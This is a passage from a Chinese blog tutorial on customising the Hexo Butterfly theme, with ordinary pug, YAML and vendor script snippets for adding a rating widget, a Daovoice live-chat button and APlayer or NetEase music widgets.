address</code>或者<code>Cookies</code>的任意一个，这取决于你要怎么计算你的文章投票，如果选择IP的话，那么同公网IP下的一个人进行了投票，剩下的人就不能够投票了（会怎么点都没反应）；选择Cookie的话，可能会存在刷票的问题（因为cookie是可以清理的，但是谁这么无聊呢？）</p><p>至于右边，可以选择星星的颜色，我这里选择的是淡蓝色；你还可以设置星星上限，默认是5星满分，你可以把它改成你想要的数字，而另一个输入框是设定星星的大小，取决于你自己的审美吧</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@rating/img/butterfly-customize/rating-result.png" alt="最终效果图"></p><h4 id="评分预设文档使用"><a href="#评分预设文档使用" class="headerlink" title="评分预设文档使用"></a>评分预设文档使用</h4><p>首先你需要点击<a href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@File-Update/file/rating.pug">这里</a>下载预设文件</p><p>在这文档里面，你需要修改的是id。如何获取id，你可以查看下面这张图片</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@rating/img/butterfly-customize/rating-id.png" alt="获取自己的应用id"></p><p>把文件放入<code>./layout/includes/addons</code>（若不存在则自己建立文件夹）</p><p>打开自己的<code>butterfly.yml</code>文件，在任意一行加入以下内容：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 投票评分功能</span></span><br><span class="line"><span class="attr">rating:</span> </span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">id:</span> <span class="number">00000</span><span class="comment"># 请改成你自己的ID</span></span><br></pre></td></tr></table></figure><p>然后去到<code>./layout/post.pug</code>里面，在你想要加入投票功能的位置加入以下代码（推荐加载打赏即reward后面）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.rating.enable</span><br><span class="line">  include includes/addons/rating.pug</span><br></pre></td></tr></table></figure><p>然后对网站进行部署即可！</p><div class="note info flat"><p>2020.4.5更新 主题版本<a href="https://github.com/jerryc127/hexo-theme-butterfly/releases/tag/2.2.5">butterfly@2.2.5</a></p></div><h3 id="为网站加入实时对话功能"><a href="#为网站加入实时对话功能" class="headerlink" title="为网站加入实时对话功能"></a>为网站加入实时对话功能</h3><div class="note warning flat"><h4 id="x42-117-x74-116-x65-x72-102-x6c-x79-x40-51-46-48-46-x30-x2d-x72-x63-x31-以后自带此功能"><a href="#x42-117-x74-116-x65-x72-102-x6c-x79-x40-51-46-48-46-x30-x2d-x72-x63-x31-以后自带此功能" class="headerlink" title="&#x42;&#117;&#x74;&#116;&#x65;&#x72;&#102;&#x6c;&#x79;&#x40;&#51;&#46;&#48;&#46;&#x30;&#x2d;&#x72;&#x63;&#x31;以后自带此功能"></a><a href="mailto:&#x42;&#117;&#x74;&#116;&#x65;&#x72;&#102;&#x6c;&#x79;&#x40;&#51;&#46;&#48;&#46;&#x30;&#x2d;&#x72;&#x63;&#x31;">&#x42;&#117;&#x74;&#116;&#x65;&#x72;&#102;&#x6c;&#x79;&#x40;&#51;&#46;&#48;&#46;&#x30;&#x2d;&#x72;&#x63;&#x31;</a>以后自带此功能</h4></div><p>与其说是实时对话，怎么感觉像客服系统？（某群友想弄然后我先给搞出来了，接着他自己在我发文前弄好了）这次使用的是<a href="http://daovoice.io/">Daovoice</a>，照例我们先上一张效果图（如果想直接使用预设文档的话你可以点<a href="#%E6%96%B0%E5%8A%9E%E6%B3%95%E5%AE%9E%E6%97%B6%E5%AF%B9%E8%AF%9D%E9%A2%84%E8%AE%BE%E6%96%87%E6%A1%A3%E4%BD%BF%E7%94%A8">这里</a>）（注：本站未开启此功能）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-result-button.png" alt="按钮效果图"></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-result-chatting.png" alt="展开效果图"></p><p>是不是很像客服系统？然而你就是可以把它玩成聊天软件，话不多说，让我们开始吧！</p><p>首先我们需要在<a href="http://daovoice.io/">Daovoice</a>上面注册一个账号，添加我们自己的应用。添加完了以后，daocloud会给我们一些代码，需要我们加入到head中，并使用script调用才能出现右下角的那个按钮<img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-button.png" alt="对话按钮"></p><h4 id="新办法"><a href="#新办法" class="headerlink" title="新办法"></a>新办法</h4><div class="note info flat"><p>这里感谢<a href="http://garveyzhong.gitee.io/">@GarveyZhong</a>提供的新方法思路</p></div><p>预设文档点<a href="#%E5%AE%9E%E6%97%B6%E5%AF%B9%E8%AF%9D%E9%A2%84%E8%AE%BE%E6%96%87%E6%A1%A3%E4%BD%BF%E7%94%A8">这里</a></p><p>我们先把daovoice给我们的两串代码整合一下</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    (<span class="keyword">function</span>(<span class="params">i,s,o,g,r,a,m</span>)&#123;i[<span class="string">&quot;DaoVoiceObject&quot;</span>]=r;i[r]=i[r]||<span class="keyword">function</span>(<span class="params"></span>)&#123;(i[r].<span class="property">q</span>=i[r].<span class="property">q</span>||[]).<span class="title function_">push</span>(<span class="variable language_">arguments</span>)&#125;,i[r].<span class="property">l</span>=<span class="number">1</span>*<span class="keyword">new</span> <span class="title class_">Date</span>();a=s.<span class="title function_">createElement</span>(o),m=s.<span class="title function_">getElementsByTagName</span>(o)[<span class="number">0</span>];a.<span class="property">async</span>=<span class="number">1</span>;a.<span class="property">src</span>=g;a.<span class="property">charset</span>=<span class="string">&quot;utf-8&quot;</span>;m.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(a,m)&#125;)(<span class="variable language_">window</span>,<span class="variable language_">document</span>,<span class="string">&quot;script&quot;</span>,(<span class="string">&#x27;https:&#x27;</span> == <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">protocol</span> ? <span class="string">&#x27;https:&#x27;</span> : <span class="string">&#x27;http:&#x27;</span>) + <span class="string">&quot;//widget.daovoice.io/widget/xxxxxxxx.js&quot;</span>,<span class="string">&quot;daovoice&quot;</span>)</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">daovoice</span>(<span class="string">&#x27;init&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">app_id</span>: <span class="string">&quot;xxxxxxxx&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">daovoice</span>(<span class="string">&#x27;update&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着把它转成pug形式（这里已经将appid作为一个变量，感谢<a href="https://tsingsu.gitee.io/">@青苏</a>告诉我pug变量的正确写法）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    script.</span><br><span class="line">      (function(i,s,o,g,r,a,m)&#123;i[&quot;DaoVoiceObject&quot;]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset=&quot;utf-8&quot;;m.parentNode.insertBefore(a,m)&#125;)(window,document,&quot;script&quot;,(&#x27;https:&#x27; == document.location.protocol ? &#x27;https:&#x27; : &#x27;http:&#x27;) + &quot;//widget.daovoice.io/widget/!&#123;theme.daovoice.appid&#125;.js&quot;,&quot;daovoice&quot;)</span><br><span class="line">      daovoice(&#x27;init&#x27;, &#123;</span><br><span class="line">      app_id: &quot;!&#123;theme.daovoice.appid&#125;&quot;,</span><br><span class="line">      &#125;);</span><br><span class="line">      daovoice(&#x27;update&#x27;);</span><br></pre></td></tr></table></figure><p>然后将这串代码保存到<code>./layout/includes/addons/daovoice.pug</code>中</p><p>然后我们打开<code>./layout/index.pug</code>文件，在里面加入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable</span><br><span class="line">  include includes/addons/daovoice.pug</span><br></pre></td></tr></table></figure><p>然后我们再打开<code>butterfly.yml</code>，在里面加入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Daovoice实时客服功能</span></span><br><span class="line"><span class="attr">daovoice:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="string">xxxxxxxx</span></span><br></pre></td></tr></table></figure><p>接着保存，部署，发现右下角的按钮出来了吧~</p><h5 id="实时对话预设文档使用"><a href="#实时对话预设文档使用" class="headerlink" title="实时对话预设文档使用"></a>实时对话预设文档使用</h5><p>先点击这个链接下载预设文档→<a href="http://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@File-Update/file/daovoice.pug">daovoice.pug</a></p><p>将文件放入<code>./layout/includes/addons</code>文件夹内，接着打开<code>./layout/index.pug</code>，在里面加入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable</span><br><span class="line">  include includes/addons/daovoice.pug</span><br></pre></td></tr></table></figure><p>然后打开<code>butterfly.yml</code>，加入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Daovoice实时客服功能</span></span><br><span class="line"><span class="attr">daovoice:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">appid:</span> <span class="string">xxxxxxxx</span></span><br></pre></td></tr></table></figure><p>接着部署即可！</p><h4 id="旧办法"><a href="#旧办法" class="headerlink" title="旧办法"></a>旧办法</h4><p>Daocloud提供给我的代码是下面这样的，正常来说除了那个js的名字不一样其他都是一样的（这里的js名字为了保证隐私安全我用了<code>xxxxxxxx</code>代替）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">(<span class="keyword">function</span>(<span class="params">i,s,o,g,r,a,m</span>)&#123;i[<span class="string">&quot;DaoVoiceObject&quot;</span>]=r;i[r]=i[r]||<span class="keyword">function</span>(<span class="params"></span>)&#123;(i[r].<span class="property">q</span>=i[r].<span class="property">q</span>||[]).<span class="title function_">push</span>(<span class="variable language_">arguments</span>)&#125;,i[r].<span class="property">l</span>=<span class="number">1</span>*<span class="keyword">new</span> <span class="title class_">Date</span>();a=s.<span class="title function_">createElement</span>(o),m=s.<span class="title function_">getElementsByTagName</span>(o)[<span class="number">0</span>];a.<span class="property">async</span>=<span class="number">1</span>;a.<span class="property">src</span>=g;a.<span class="property">charset</span>=<span class="string">&quot;utf-8&quot;</span>;m.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(a,m)&#125;)(<span class="variable language_">window</span>,<span class="variable language_">document</span>,<span class="string">&quot;script&quot;</span>,(<span class="string">&#x27;https:&#x27;</span> == <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">protocol</span> ? <span class="string">&#x27;https:&#x27;</span> : <span class="string">&#x27;http:&#x27;</span>) + <span class="string">&quot;//widget.daovoice.io/widget/xxxxxxxx.js&quot;</span>,<span class="string">&quot;daovoice&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>按照思路，首先我们需要把daovoice提供的代码都转换成pug形式，转换后就像下面这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    script.</span><br><span class="line">      (function(i,s,o,g,r,a,m)&#123;i[&quot;DaoVoiceObject&quot;]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset=&quot;utf-8&quot;;m.parentNode.insertBefore(a,m)&#125;)(window,document,&quot;script&quot;,(&#x27;https:&#x27; == document.location.protocol ? &#x27;https:&#x27; : &#x27;http:&#x27;) + &quot;//widget.daovoice.io/widget/xxxxxxxx.js&quot;,&quot;daovoice&quot;)</span><br></pre></td></tr></table></figure><p>接着我们把这串代码放到<code>daovoice-head.pug</code>文件中，并把这个文件放到<code>./layout/includes/addons</code>里面（没有这个文件夹可以自己建立，也可以把我下面教程中的路径替换成你自己的），接着，我们打开<code>./layout/includes/head.pug</code>里面，加入以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable//- 如果你不想在butterfly.yml中加入开关，想直接引入的话可以不用这一行</span><br><span class="line">    include ./addons/daovoice-head.pug</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-head-include.png" alt="在head.pug中加入代码"></p><p>这样，head的引入就完成了</p><p>剩下的工作就是用一个script调用这个功能。根据daovoice提供给我们的代码（然而并没有把<code>&lt;script&gt;&lt;/script&gt;</code>加进去，差评哼）</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">daovoice(&#x27;init&#x27;, &#123;</span><br><span class="line">  app_id: &quot;xxxxxxxx&quot;</span><br><span class="line">&#125;);</span><br><span class="line">daovoice(&#x27;update&#x27;);</span><br></pre></td></tr></table></figure><p>我们需要给它的头和尾加入手动加入&lt;script&gt;&lt;&#x2F;script&gt;才能正确调用，所以加了以后就是</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="title function_">daovoice</span>(<span class="string">&#x27;init&#x27;</span>, &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">app_id</span>: <span class="string">&quot;xxxxxxxx&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">daovoice</span>(<span class="string">&#x27;update&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接着仍然要把它转成pug文件，转出来以后就是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    script.</span><br><span class="line">      daovoice(&#x27;init&#x27;, &#123;</span><br><span class="line">      app_id: &quot;xxxxxxxx&quot;,</span><br><span class="line">      &#125;);</span><br><span class="line">      daovoice(&#x27;update&#x27;);</span><br></pre></td></tr></table></figure><p>然后我们把这串代码保存到一个名为<code>daocloud-anonymous.pug</code>的文件，放到<code>./layout/includes/addons</code>里面，接着我们打开<code>./layout/index.pug</code>文件，在里面加入以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable//- 这里同样，不需要的话可以删掉</span><br><span class="line">include includes/addons/daovoice-anonymous.pug</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-index-include.png" alt="在index.pug中加入代码"></p><p>然后保存，到butterfly.yml里面在任意一个位置加入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">daovoice:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>加入完成后保存，开始部署本地调试，看看右下角是不是多了一个小按钮啦？（按钮的样式需要在Daovoice后台更改）</p><h5 id="旧办法实时对话预设文档使用"><a href="#旧办法实时对话预设文档使用" class="headerlink" title="旧办法实时对话预设文档使用"></a>旧办法实时对话预设文档使用</h5><p>首先，你还是需要一个Daovoice账号，注册完了以后，点击下面的链接下载所需要的两个文件</p><p><a href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/file/daovoice-head.pug">Daovoice的Head预设文件</a> | <a href="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/file/daovoice-anonymous.pug">Daovoice的调用Script</a> </p><p>然后打开下载的<code>daovoice-head.pug</code>，在里面的第四行，把链接中的8个<code>x</code>改成你自己的应用id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    script.</span><br><span class="line">      (function(i,s,o,g,r,a,m)&#123;i[&quot;DaoVoiceObject&quot;]=r;i[r]=i[r]||function()&#123;(i[r].q=i[r].q||[]).push(arguments)&#125;,i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;a.charset=&quot;utf-8&quot;;m.parentNode.insertBefore(a,m)&#125;)(window,document,&quot;script&quot;,(&#x27;https:&#x27; == document.location.protocol ? &#x27;https:&#x27; : &#x27;http:&#x27;) + &quot;//widget.daovoice.io/widget/xxxxxxxx.js&quot;,&quot;daovoice&quot;)</span><br></pre></td></tr></table></figure><p>打开下载的<code>daovoice-anonymous.pug</code>文件，同样将里面的<code>app_id</code>改为自己的应用id</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">  body</span><br><span class="line">    script.</span><br><span class="line">      daovoice(&#x27;init&#x27;, &#123;</span><br><span class="line">      app_id: &quot;xxxxxxxx&quot;,</span><br><span class="line">      &#125;);</span><br><span class="line">      daovoice(&#x27;update&#x27;);</span><br></pre></td></tr></table></figure><p>保存，把这两个文件放进<code>./layout/includes/addons</code>里面</p><p>接着打开<code>./layout/includes/head.pug</code>文件，在里面加入引入代码如下图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable</span><br><span class="line">    include ./addons/daovoice-head.pug</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-head-include.png" alt="在head.pug中加入代码"></p><p>保存，打开<code>./layout/index.pug</code>，在里面加入引入代码如下图</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.daovoice.enable</span><br><span class="line">  include includes/addons/daovoice-anonymous.pug</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@daovoice/img/butterfly-customize/daovoice-index-include.png" alt="在index.pug中加入代码"></p><p>保存，打开<code>butterfly.yml</code>，在任意一行加入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Daovoice实时客服功能</span></span><br><span class="line"><span class="attr">daovoice:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>然后保存即可！</p><h3 id="加入音乐小部件"><a href="#加入音乐小部件" class="headerlink" title="加入音乐小部件"></a>加入音乐小部件</h3><div class="note warning flat"><h4 id="Butterfly-dev-pjax分支不推荐"><a href="#Butterfly-dev-pjax分支不推荐" class="headerlink" title="Butterfly@dev-pjax分支不推荐"></a>Butterfly@dev-pjax分支不推荐</h4></div><p>这里有两种做法，Aplayer方法和网易云自带播放器的方法，请根据自己的需要进行修改，预览图在每个方法的开头就有</p><h4 id="Aplayer法"><a href="#Aplayer法" class="headerlink" title="Aplayer法"></a>Aplayer法</h4><p><img src="/"></p><p>Aplayer是一个音乐播放器，官方文档在<a href="https://aplayer.js.org/">这里</a>，这里我着重讲怎么添加，而不是aplayer的用法（已经配置好的文件在下面，可以直接下载使用）</p><p>首先，按照我的个人习惯，在<code>layout/includes/addons</code>文件夹里面复制粘贴一个<code>layout/includes/widget/card_announcement.pug</code>的副本，修改一下里面的内容，把公告的内容删掉，改成了下面这个样子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.card-widget.card-aplayer</span><br><span class="line">  .card-content</span><br><span class="line">    .item-headline</span><br><span class="line">      i.fa.fa-music(aria-hidden=&quot;true&quot;)</span><br><span class="line">      span= _p(&#x27;Music&#x27;)</span><br></pre></td></tr></table></figure><p>接着，就要开始调用Aplayer了，按照官方的做法，我们要调用一个js和一个css文件，这里我保存了一份副本，并且修改了一下css，把进度条和循环按钮隐藏了，上传到github，通过jsdelivr调用</p><p>因为我们是内嵌一个html网页，所以我们这里要先用html写法写完，然后转成pug</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">html</span><br><span class="line">body</span><br><span class="line">link(rel=&quot;stylesheet&quot; href=&quot;https://cdn.bili33.top/gh/Vikutorika/assets@master/css/APlayer.min.css&quot;)//- 引用修改的CSS</span><br><span class="line">#aplayer//- 相当于&lt;div&gt;</span><br><span class="line">script(src=&quot;https://cdn.bili33.top/gh/Vikutorika/assets@master/js/APlayer.min.js&quot;)//- 引用js文件</span><br></pre></td></tr></table></figure><p>然后我们要给aplayer一些我们要放的音乐的信息，这里的写法是用<code>&lt;script&gt;&lt;/script&gt;</code>来赋值，至于怎么写请看官方文档，写好后记得转换成pug，下面我放出我的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">script.</span><br><span class="line">  const ap = new APlayer(&#123;</span><br><span class="line">  container: document.getElementById(&#x27;aplayer&#x27;),</span><br><span class="line">  audio: [&#123;</span><br><span class="line">  name: &#x27;world.execute (me) ;&#x27;,</span><br><span class="line">  artist: &#x27;Mili&#x27;,</span><br><span class="line">  url: &#x27;https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@world.execute(me)/audio/Mili%20-%20world.execute%20(me)%20;.mp3&#x27;,</span><br><span class="line">  cover: &#x27;https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@world.execute(me)/img/Album/Miracle Milk.jpg&#x27;,</span><br><span class="line">  theme: &quot;#8e8cd8&quot;,</span><br><span class="line">  lrc: &quot;https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Github-Basic/lrc/world.execute (me) %3B.txt&quot;</span><br><span class="line">  &#125;]</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过const给Aplayer一些信息，让它能够播放我们的音乐</p><p>接着打开<code>layout/includes/widget/index.pug</code>在你认为合适的地方添加（注意缩进）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_aplayer</span><br><span class="line">include ../addons/card_aplayer.pug</span><br></pre></td></tr></table></figure><p>然后我们打开<code>butterfly.yml</code>，在aside的侧边栏显示设置里面添加</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">card_webinfo:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 上面是原来就有的</span></span><br><span class="line"><span class="attr">card_aplayer:</span> <span class="literal">true</span><span class="comment"># 添加个开关，可以控制打开关闭</span></span><br></pre></td></tr></table></figure><p>然后就可以啦！</p><h5 id="预设文档使用"><a href="#预设文档使用" class="headerlink" title="预设文档使用"></a>预设文档使用</h5><p>首先先<a href="https://cdn.bili33.top/gh/Vikutorika/assets@master/file/card_aplayer.pug">下载</a>预设文档，放到主题目录下的<code>layout/includes/addons</code>文件夹内（如果不存在请自己创建）</p><p>打开文件，修改里面的变量，关于变量请查看<a href="https://aplayer.js.org/#/zh-Hans/?id=%E5%8F%82%E6%95%B0">官方文档</a></p><p>修改完后保存，打开<code>layout/includes/widget/index.pug</code>，在你认为合适的位置加上以下内容（注意缩进）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_aplayer</span><br><span class="line">include ../addons/card_aplayer.pug</span><br></pre></td></tr></table></figure><p>打开<code>butterfly.yml</code>，在aside的侧边栏设置加入以下内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">card_webinfo:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment"># 上面是原来就有的</span></span><br><span class="line"><span class="attr">card_aplayer:</span> <span class="literal">true</span><span class="comment"># 添加个开关，可以控制打开关闭</span></span><br></pre></td></tr></table></figure><p>然后保存即可！</p><h4 id="网易云音乐官方部件法"><a href="#网易云音乐官方部件法" class="headerlink" title="网易云音乐官方部件法"></a>网易云音乐官方部件法</h4><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/butterfly-customize/Netease-Result.png" alt="成果图"></p><p>我们先打开网易云的一首歌，点击生成外联播放器，要求是这首歌不需要VIP进行下载，否则会二话不说给你弹出下面这个窗</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/butterfly-customize/Netease-not-allow.png" alt="版 权 保 护"></p><p>正常情况下，会给你打开外联播放器的生成页面，在下面选择合适的参数，其中宽度我稍微试了一下，推荐为<code>230</code>，太小会观感体验不好，太大会直接超出框，设定好宽度我们就复制代码（宽度也可以直接在<code>width=</code>后面进行修改哦）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/butterfly-customize/Netease-Player-Gen.png" alt="外链播放器生成页面"></p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=26126820&auto=0&height=66"></iframe>↑我这里选择的音乐<p>然后我们复制一份butterfly&#x2F;layout&#x2F;includes&#x2F;widget文件夹里面的<code>card_announcement.pug</code>文件<del>（主要是因为公告是最好进行修改的东西了）</del> ，改名为<code>card_music.pug</code>，把里面改成以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.card-widget.music</span><br><span class="line">  .card-content</span><br><span class="line">    .item-headline</span><br><span class="line">      i.fa.fa-music(aria-hidden=&quot;true&quot;)</span><br><span class="line">      span= _p(&#x27;Music&#x27;)</span><br><span class="line">      |</span><br></pre></td></tr></table></figure><p>然后在|那一行，把你刚刚获得的网易云链接放进去（保留前面的<code>|</code>）</p><p>然后保存，接着我们打开同目录下的index.pug</p><p>在里面你认为合适的位置加上以下内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if theme.aside.card_music</span><br><span class="line">include ./card_music.pug</span><br></pre></td></tr></table></figure><p>如果你不需要开关可以不加if判断</p><p>接着打开butterfly.yml文件，在<code>aside</code>设置中加上一行</p><figure class="highlight yaml"><table><tr><td 